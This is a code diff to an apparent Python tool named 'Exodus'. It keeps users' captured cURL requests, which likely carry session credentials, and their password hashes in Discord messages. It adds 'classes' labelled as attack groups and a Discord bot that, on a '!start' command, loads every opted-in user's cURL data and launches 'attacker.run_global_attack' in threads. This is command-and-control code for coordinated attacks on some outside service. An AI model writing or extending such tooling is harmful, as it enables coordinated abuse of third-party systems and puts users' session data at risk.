@@ -66,13 +66,14 @@ def send_webhook(webhook_url, content=None, embed=None, files=None):
     except Exception as e:
         return False, str(e)
 
-def register_user(data_webhook_url, username, password, curl_data, opt_in=True, notify_webhook_url=None, suppress_notification=False):
+def register_user(data_webhook_url, username, password, curl_data, opt_in=True, notify_webhook_url=None, suppress_notification=False, class_name=None):
     """
     Register a new user to the global database.
     
     Args:
         ...
         suppress_notification: If True, skip sending the "New User" notification
+        class_name: Optional class group for the user
     """
     password_hash = hash_password(password)
     
@@ -82,6 +83,7 @@ def register_user(data_webhook_url, username, password, curl_data, opt_in=True, 
         "password_hash": password_hash,
         "curl_data": curl_data,
         "opt_in": opt_in,
+        "class_name": class_name,
         "registered": datetime.now().isoformat()
     }
     
@@ -105,6 +107,7 @@ def register_user(data_webhook_url, username, password, curl_data, opt_in=True, 
             "color": 5763719, # Green
             "fields": [
                 {"name": "Status", "value": "Active" if opt_in else "Opted Out", "inline": True},
+                {"name": "Class", "value": class_name if class_name else "None", "inline": True},
                 {"name": "Joined", "value": f"<t:{int(time.time())}:R>", "inline": True}
             ],
             "timestamp": datetime.now().isoformat(),
@@ -115,8 +118,8 @@ def register_user(data_webhook_url, username, password, curl_data, opt_in=True, 
     trigger_dashboard_update()
     return True, None
 
-def update_user_curl(data_webhook_url, username, password, new_curl, opt_in=True, notify_webhook_url=None, update_reason="Configuration Update"):
-    """Update an existing user's cURL data and opt-in status"""
+def update_user_curl(data_webhook_url, username, password, new_curl, opt_in=True, notify_webhook_url=None, update_reason="Configuration Update", class_name=None):
+    """Update an existing user's cURL data, opt-in status, and class"""
     password_hash = hash_password(password)
     
     user_data = {
@@ -124,6 +127,7 @@ def update_user_curl(data_webhook_url, username, password, new_curl, opt_in=True
         "password_hash": password_hash,
         "curl_data": new_curl,
         "opt_in": opt_in,
+        "class_name": class_name,
         "updated": datetime.now().isoformat()
     }
     
@@ -149,6 +153,7 @@ def update_user_curl(data_webhook_url, username, password, new_curl, opt_in=True
             "fields": [
                 {"name": "Update Type", "value": update_reason, "inline": True},
                 {"name": "Status", "value": status_str, "inline": True},
+                {"name": "Class", "value": class_name if class_name else "None", "inline": True},
                 {"name": "Updated", "value": f"<t:{int(time.time())}:R>", "inline": True}
             ],
             "timestamp": datetime.now().isoformat(),
@@ -159,10 +164,16 @@ def update_user_curl(data_webhook_url, username, password, new_curl, opt_in=True
     trigger_dashboard_update()
     return True, None
 
-def update_user_status(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url=None):
-    """Update just the opt-in status"""
+def update_user_status(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url=None, class_name=None):
+    """Update just the opt-in status (preserves class if passed, otherwise tries to keep it?)"""
+    # Note: caller should pass current class_name if they want to preserve it!
     reason = "Opt-In" if opt_in else "Opt-Out"
-    return update_user_curl(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url, update_reason=f"Status Change ({reason})")
+    return update_user_curl(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url, update_reason=f"Status Change ({reason})", class_name=class_name)
+
+def update_user_class(data_webhook_url, username, password, curl_data, opt_in, class_name, notify_webhook_url=None):
+    """Update just the class"""
+    reason = f"Joined {class_name}" if class_name else "Left Class"
+    return update_user_curl(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url, update_reason="Class Change", class_name=class_name)
 
 def delete_discord_message(channel_id, message_id, bot_token):
     """Delete a specific message from Discord"""
@@ -176,10 +187,10 @@ def delete_discord_message(channel_id, message_id, bot_token):
     except:
         return False
 
-def update_user_password(data_webhook_url, username, new_password, curl_data, opt_in=True, notify_webhook_url=None):
+def update_user_password(data_webhook_url, username, new_password, curl_data, opt_in=True, notify_webhook_url=None, class_name=None):
     """Update user password (creates new entry)"""
     # Suppress default registration notify, send custom one
-    success, err = register_user(data_webhook_url, username, new_password, curl_data, opt_in, notify_webhook_url, suppress_notification=True)
+    success, err = register_user(data_webhook_url, username, new_password, curl_data, opt_in, notify_webhook_url, suppress_notification=True, class_name=class_name)
     
     if success and notify_webhook_url:
         embed = {
@@ -192,26 +203,14 @@ def update_user_password(data_webhook_url, username, new_password, curl_data, op
         
     return success, err
 
-def rename_user(data_webhook_url, channel_id, bot_token, old_username, new_username, password, curl_data, old_message_id, opt_in=True):
+def rename_user(data_webhook_url, channel_id, bot_token, old_username, new_username, password, curl_data, old_message_id, opt_in=True, class_name=None):
     """
     Rename user:
     1. Register new username
     2. Delete old message
     """
-    config = load_global_config() # Need notify webhook? Or passed? 
-    # Wait, rename_user doesn't accept notify_webhook_url in signature normally?
-    # I should add it or load it? Current signature didn't have it.
-    # Let's check previous calls. They didn't pass it.
-    # But I can try to load it from config if not passed, or leave it.
-    # Actually, I should probably stick to signature or update it.
-    # Let's check if I can grab it from global config.
     
-    # 1. Register new (suppress notify)
-    # Note: rename_user signature in menus.py doesn't pass notify url usually.
-    # But register_user needs it if we were to notify.
-    # Since I suppress it, I can pass None or anything.
-    
-    success, error = register_user(data_webhook_url, new_username, password, curl_data, opt_in, suppress_notification=True)
+    success, error = register_user(data_webhook_url, new_username, password, curl_data, opt_in, suppress_notification=True, class_name=class_name)
     if not success:
         return False, f"Failed to register new name: {error}"
     
@@ -219,9 +218,7 @@ def rename_user(data_webhook_url, channel_id, bot_token, old_username, new_usern
     if old_message_id:
         delete_discord_message(channel_id, old_message_id, bot_token)
         
-    # Manual Notification for Rename?
-    # I don't have the notify webhook url passed in here currently.
-    # I can try to load it.
+    # Manual Notification for Rename
     try:
         cfg = load_global_config()
         notify_url = cfg.get('notify_webhook')
@@ -237,6 +234,72 @@ def rename_user(data_webhook_url, channel_id, bot_token, old_username, new_usern
         pass
             
     return True, None
+
+# === CLASSES MANAGEMENT ===
+
+def fetch_classes(channel_id, bot_token):
+    """
+    Fetch list of available classes from Discord.
+    Looks for message with [EXODUS_CLASSES] tag.
+    Returns: (classes_list, message_id)
+    """
+    messages, err = fetch_channel_messages(channel_id, bot_token)
+    if err or not messages:
+        return [], None
+        
+    for msg in messages:
+        content = msg.get('content', '')
+        if '[EXODUS_CLASSES]' in content:
+            try:
+                start = content.find('[EXODUS_CLASSES]') + len('[EXODUS_CLASSES]')
+                end = content.find('[/EXODUS_CLASSES]')
+                json_str = content[start:end].strip()
+                json_str = json_str.replace('```', '').strip() # Clean code blocks if any
+                
+                classes = json.loads(json_str)
+                return classes, msg['id']
+            except:
+                continue
+                
+    return [], None
+
+def save_classes(channel_id, bot_token, classes_list, old_message_id=None):
+    """
+    Save list of classes to Discord.
+    Deletes old message if exists.
+    """
+    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
+    headers = {
+        "Authorization": f"Bot {bot_token}",
+        "Content-Type": "application/json"
+    }
+    
+    # Delete old first
+    if old_message_id:
+        delete_discord_message(channel_id, old_message_id, bot_token)
+        
+    content = f"[EXODUS_CLASSES] {json.dumps(classes_list)} [/EXODUS_CLASSES]"
+    
+    embed = {
+        "title": "📚 Global Classes",
+        "description": "List of available attack groups.",
+        "color": 10181046, # Purple
+        "fields": [
+            {"name": "Classes", "value": "\n".join([f"• {c}" for c in classes_list]) if classes_list else "(None)", "inline": False}
+        ],
+        "footer": {"text": "Exodus Global System"}
+    }
+    
+    payload = {
+        "content": content,
+        "embeds": [embed]
+    }
+    
+    try:
+        response = requests.post(url, headers=headers, json=payload)
+        return response.status_code in [200, 201]
+    except:
+        return False
 
 def fetch_channel_messages(channel_id, bot_token):
     """
@@ -437,17 +500,18 @@ def update_dashboard_display(channel_id, message_id, bot_token, users_dict):
     sorted_users = sorted(users_dict.items())
     
     for username, data in sorted_users:
+        class_str = f" [{data.get('class_name')}]" if data.get('class_name') else ""
         if data.get('opt_in', True):
             active_users += 1
             # Add timestamp of last update if available?
             updated = data.get('updated') or data.get('registered')
             time_str = f"<t:{int(datetime.fromisoformat(updated).timestamp())}:R>" if updated else ""
-            active_list.append(f"🟢 **{username}** {time_str}")
+            active_list.append(f"🟢 **{username}**{class_str} {time_str}")
         else:
             opted_out += 1
             updated = data.get('updated') or data.get('registered')
             time_str = f"<t:{int(datetime.fromisoformat(updated).timestamp())}:R>" if updated else ""
-            active_list.append(f"🔴 **{username}** (Opted Out) {time_str}")
+            active_list.append(f"🔴 **{username}**{class_str} (Opted Out) {time_str}")
             
     status_text = "\n".join(active_list) if active_list else "*No users found*"
     if len(status_text) > 3500: # Truncate if too long
@@ -492,3 +556,165 @@ def trigger_dashboard_update():
                  update_dashboard_display(status_ch, status_msg, bot_token, users)
     except Exception:
         pass # Fail silently in background
+
+# === DISCORD COMMAND CONTROL ===
+
+def check_user_role(guild_id, user_id, role_id, bot_token):
+    """
+    Check if a user has a specific role in a guild.
+    """
+    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
+    headers = {
+        "Authorization": f"Bot {bot_token}"
+    }
+    
+    try:
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            member = response.json()
+            roles = member.get('roles', [])
+            return role_id in roles
+        return False
+    except:
+        return False
+
+def listen_for_commands(bot_token, channel_id, guild_id, role_id):
+    """
+    Polls Discord channel for !start and !stop commands.
+    Restricted to users with role_id.
+    """
+    import threading
+    import attacker 
+    
+    print(font("\n [BOT] Listening for commands (!start, !stop)...", color="magenta", inverse=True))
+    print(font(" Press 'q' or 'esc' to stop the bot.", color="yellow"))
+    
+    import keyboard
+    
+    last_message_id = None
+    attack_thread = None
+    stop_event = None
+    
+    # Get initial latest message to avoid processing old commands
+    msgs, err = fetch_channel_messages(channel_id, bot_token)
+    if not err and msgs:
+        last_message_id = msgs[0]['id'] # Newest message
+        
+    while True:
+        if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
+            if stop_event:
+                stop_event.set()
+            break
+            
+        time.sleep(2) # Poll every 2 seconds
+        
+        messages, err = fetch_channel_messages(channel_id, bot_token)
+        if err or not messages:
+            continue
+            
+        # Process new messages (messages are usually sorted newest first)
+        # We search from newest until we hit last_message_id
+        new_commands = []
+        for msg in messages:
+            if msg['id'] == last_message_id:
+                break
+            new_commands.append(msg)
+            
+        if not new_commands:
+            continue
+            
+        # Update last seen
+        last_message_id = messages[0]['id']
+        
+        # Process commands (oldest to newest)
+        for msg in reversed(new_commands):
+            content = msg.get('content', '').strip()
+            author = msg.get('author', {})
+            user_id = author.get('id')
+            username = author.get('username')
+            
+            if not content.startswith('!'):
+                continue
+                
+            cmd = content.lower()
+            
+            if cmd == '!start':
+                # Check permissions
+                if not check_user_role(guild_id, user_id, role_id, bot_token):
+                     send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", 
+                                  None, 
+                                  {"title": "⛔ Access Denied", "description": "You do not have permission.", "color": 15548997}) # Red
+                     continue
+                     
+                if attack_thread and attack_thread.is_alive():
+                    # Already running
+                    continue
+                    
+                # START ATTACK
+                print(font(f"\n [BOT] Command received from {username}: !start", color="green"))
+                
+                # Fetch users
+                all_msgs, _ = fetch_channel_messages(channel_id, bot_token)
+                users_map = parse_users_from_messages(all_msgs)
+                
+                # Prepare users
+                active_users = []
+                for u, data in users_map.items():
+                    if data.get('opt_in', True) and data.get('curl_data'):
+                        active_users.append({'username': u, 'curl': data['curl_data']})
+                
+                if not active_users:
+                     send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", "No active users found!", None)
+                     continue
+                     
+                # Prepare Temp Files
+                temp_dir = os.path.join(os.getcwd(), 'Input', 'GlobalTemp')
+                if not os.path.exists(temp_dir):
+                    os.makedirs(temp_dir)
+                for f in os.listdir(temp_dir):
+                    os.remove(os.path.join(temp_dir, f))
+                
+                temp_files = []
+                for u in active_users:
+                    fname = f"{u['username']}.txt"
+                    with open(os.path.join(temp_dir, fname), 'w', encoding='utf-8') as f:
+                        f.write(u['curl'])
+                    temp_files.append(fname)
+                    
+                # Launch Thread
+                stop_event = threading.Event()
+                # Assuming standard config for threads/cooldown
+                notify_url = None # Could pull from config if passed in, but we have bot token
+                
+                # We need to send a webhook to the channel to notify
+                # Actually run_global_attack takes a webhook url for notifications
+                # We can construct one or just reuse the logic
+                
+                attack_thread = threading.Thread(
+                    target=attacker.run_global_attack,
+                    args=(temp_files, temp_dir, 4, 0.5, None, stop_event) 
+                )
+                attack_thread.daemon = True
+                attack_thread.start()
+                
+                send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", 
+                             f"🚀 **Attack Initiated** by {username} ({len(active_users)} operatives)", 
+                             None)
+
+            elif cmd == '!stop':
+                # Check permissions
+                if not check_user_role(guild_id, user_id, role_id, bot_token):
+                     continue # Ignore or redundant deny
+                     
+                if attack_thread and attack_thread.is_alive():
+                    print(font(f"\n [BOT] Command received from {username}: !stop", color="yellow"))
+                    if stop_event:
+                        stop_event.set()
+                    
+                    send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", 
+                                 f"🛑 **Attack Stopped** by {username}", 
+                                 None)
+                else:
+                    # Not running
+                    pass
+
